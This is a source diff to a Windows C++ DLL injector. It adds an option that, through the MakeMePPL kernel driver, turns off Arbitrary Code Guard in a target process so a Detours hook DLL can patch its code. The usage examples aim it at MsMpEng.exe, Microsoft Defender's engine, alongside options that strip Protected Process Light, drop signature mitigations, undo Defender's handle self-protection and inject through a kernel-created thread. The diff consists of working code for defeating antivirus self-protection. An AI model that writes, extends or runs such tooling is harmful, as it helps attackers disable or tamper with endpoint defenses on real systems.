@@ -20,6 +20,9 @@
  *                    block-non-Microsoft-binaries DLL mitigation
  *                    (IOCTL_PPL_ALLOW_NON_MS_DLLS) before injecting.
  *                    The driver tracks both changes.
+ *   --allow-dynamic-code  clear ACG / DisableDynamicCode through MakeMePPL so a
+ *                    Detours payload can make image code pages writable
+ *                    (IOCTL_PPL_ALLOW_DYNAMIC_CODE). Tracked as well.
  *   --fix-handle     restore process access that a protection callback
  *                    (Defender self-protection) stripped from the handle
  *                    returned by OpenProcess.
@@ -27,14 +30,17 @@
  *                    MakeMePPL, bypassing the user-mode protected-process
  *                    thread-creation check.
  *   --restore        after injection, ask MakeMePPL to restore the original
- *                    protection and signature mitigation (only with --ppl).
+ *                    protection and signature mitigation (only with --ppl
+ *                    and/or --allow-dynamic-code).
  *
  * Usage:
  *   injector.exe <pid|image name> <full\path\to\payload.dll>
- *                [--ppl] [--fix-handle] [--kernel-thread] [--restore]
+ *                [--ppl] [--allow-dynamic-code] [--fix-handle]
+ *                [--kernel-thread] [--restore]
  *
  * Examples:
  *   injector.exe MsMpEng.exe C:\data\payload.dll --ppl --fix-handle --kernel-thread
+ *   injector.exe MsMpEng.exe C:\data\mpengine_hook.dll --ppl --allow-dynamic-code --fix-handle --kernel-thread
  *   injector.exe 1234 C:\data\payload.dll
  */
 
@@ -69,6 +75,7 @@ struct Options {
     std::wstring TargetArgument;
     std::wstring DllPath;
     bool Ppl = false;
+    bool AllowDynamicCode = false;
     bool FixHandle = false;
     bool KernelThread = false;
     bool Restore = false;
@@ -86,17 +93,21 @@ PrintUsage()
     std::fwprintf(
         stderr,
         L"usage: injector.exe <pid|image name> <full\\path\\to\\payload.dll>\n"
-        L"                    [--ppl] [--fix-handle] [--kernel-thread] [--restore]\n"
+        L"                    [--ppl] [--allow-dynamic-code] [--fix-handle]\n"
+        L"                    [--kernel-thread] [--restore]\n"
         L"\n"
-        L"  --ppl            remove PPL and the block-non-Microsoft-binaries\n"
-        L"                   mitigation from the target via MakeMePPL\n"
-        L"  --fix-handle     restore access stripped by a protection callback\n"
-        L"  --kernel-thread  create the remote thread through MakeMePPL\n"
-        L"                   (bypasses the user-mode PPL thread-creation check)\n"
-        L"  --restore        restore protection/mitigation after injection\n"
-        L"                   (only meaningful together with --ppl)\n"
+        L"  --ppl               remove PPL and the block-non-Microsoft-binaries\n"
+        L"                      mitigation from the target via MakeMePPL\n"
+        L"  --allow-dynamic-code clear ACG (DisableDynamicCode) so a Detours\n"
+        L"                      payload can patch code pages (requires the driver)\n"
+        L"  --fix-handle        restore access stripped by a protection callback\n"
+        L"  --kernel-thread     create the remote thread through MakeMePPL\n"
+        L"                      (bypasses the user-mode PPL thread-creation check)\n"
+        L"  --restore           restore protection/mitigation after injection\n"
+        L"                      (with --ppl or --allow-dynamic-code)\n"
         L"\n"
-        L"  --ppl, --fix-handle and --kernel-thread require the MakeMePPL driver.\n"
+        L"  --ppl, --allow-dynamic-code, --fix-handle and --kernel-thread require\n"
+        L"  the MakeMePPL driver.\n"
         L"  Example: injector.exe MsMpEng.exe C:\\data\\payload.dll\n"
         L"                     --ppl --fix-handle --kernel-thread\n");
 }
@@ -420,9 +431,9 @@ bool
 RestorePplTarget(
     _In_ DWORD ProcessId)
 {
-    HANDLE device;
     PPL_OPERATION_RESULT result = {};
     DWORD returned = 0;
+    HANDLE device;
     bool ok;
 
     device = PplOpenDevice();
@@ -452,6 +463,52 @@ RestorePplTarget(
     std::wprintf(L"[+] protection restored: 0x%02X -> 0x%02X\n",
                  static_cast<unsigned>(result.OldProtection),
                  static_cast<unsigned>(result.NewProtection));
+    return true;
+}
+
+/*
+ * Detours needs to change the protection of the target's image code pages.
+ * ACG (ProcessDynamicCodePolicy / MitigationFlags1 bit 8) blocks that even
+ * after PPL is cleared, so the Detours payload needs this IOCTL first.
+ */
+bool
+AllowDynamicCodeOnTarget(
+    _In_ DWORD ProcessId)
+{
+    HANDLE device;
+    PPL_MITIGATION_REQUEST request = {};
+    PPL_MITIGATION_RESULT result = {};
+    DWORD returned = 0;
+    BOOL ok;
+
+    device = PplOpenDevice();
+    if (device == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    request.ProcessId = ProcessId;
+
+    ok = PplIoctl(device, IOCTL_PPL_ALLOW_DYNAMIC_CODE,
+                  &request, sizeof(request),
+                  &result, sizeof(result), &returned);
+    CloseHandle(device);
+
+    if (!ok) {
+        return false;
+    }
+
+    if (!PplNtSuccess(result.Status)) {
+        std::fwprintf(stderr,
+                      L"[-] allow-dynamic-code pid %lu failed: %s (0x%08lX)\n",
+                      static_cast<unsigned long>(ProcessId),
+                      PplNtStatusText(result.Status).c_str(),
+                      static_cast<unsigned long>(result.Status));
+        return false;
+    }
+
+    std::wprintf(L"[+] ACG off       : mit1 0x%08lX -> 0x%08lX\n",
+                 static_cast<unsigned long>(result.OldMitigationFlags1),
+                 static_cast<unsigned long>(result.NewMitigationFlags1));
     return true;
 }
 
@@ -622,8 +679,9 @@ InjectDll(
     std::wprintf(L"[*] target pid    : %lu\n",
                  static_cast<unsigned long>(Options.ProcessId));
     std::wprintf(L"[*] dll to inject : %s\n", Options.DllPath.c_str());
-    std::wprintf(L"[*] options       :%s%s%s%s\n",
+    std::wprintf(L"[*] options       :%s%s%s%s%s\n",
                  Options.Ppl ? L" --ppl" : L"",
+                 Options.AllowDynamicCode ? L" --allow-dynamic-code" : L"",
                  Options.FixHandle ? L" --fix-handle" : L"",
                  Options.KernelThread ? L" --kernel-thread" : L"",
                  Options.Restore ? L" --restore" : L"");
@@ -637,6 +695,16 @@ InjectDll(
         if (!PreparePplTarget(Options.ProcessId)) {
             std::fwprintf(stderr,
                           L"[-] could not prepare the PPL target "
+                          L"(is the MakeMePPL driver loaded?)\n");
+            return 1;
+        }
+    }
+
+    if (Options.AllowDynamicCode) {
+        std::wprintf(L"[*] clearing ACG for Detours\n");
+        if (!AllowDynamicCodeOnTarget(Options.ProcessId)) {
+            std::fwprintf(stderr,
+                          L"[-] could not clear ACG "
                           L"(is the MakeMePPL driver loaded?)\n");
             return 1;
         }
@@ -796,10 +864,16 @@ cleanup:
         CloseHandle(process);
     }
 
-    if (Options.Ppl && Options.Restore) {
+    if ((Options.Ppl || Options.AllowDynamicCode) && Options.Restore) {
+        /*
+         * Payloads such as mpengine_hook.dll install their hooks from a
+         * worker thread after LoadLibrary returns. Give that thread time to
+         * finish before re-enabling protections.
+         */
+        Sleep(750);
         std::wprintf(L"[*] restoring original protection/mitigation\n");
         (void)RestorePplTarget(Options.ProcessId);
-    } else if (Options.Ppl) {
+    } else if (Options.Ppl || Options.AllowDynamicCode) {
         std::wprintf(
             L"[*] protection changes are tracked; run "
             L"'pplctl clear --pid %lu' to restore them\n",
@@ -833,6 +907,8 @@ wmain(
     for (i = 3; i < argc; ++i) {
         if (_wcsicmp(argv[i], L"--ppl") == 0) {
             options.Ppl = true;
+        } else if (_wcsicmp(argv[i], L"--allow-dynamic-code") == 0) {
+            options.AllowDynamicCode = true;
         } else if (_wcsicmp(argv[i], L"--fix-handle") == 0) {
             options.FixHandle = true;
         } else if (_wcsicmp(argv[i], L"--kernel-thread") == 0) {
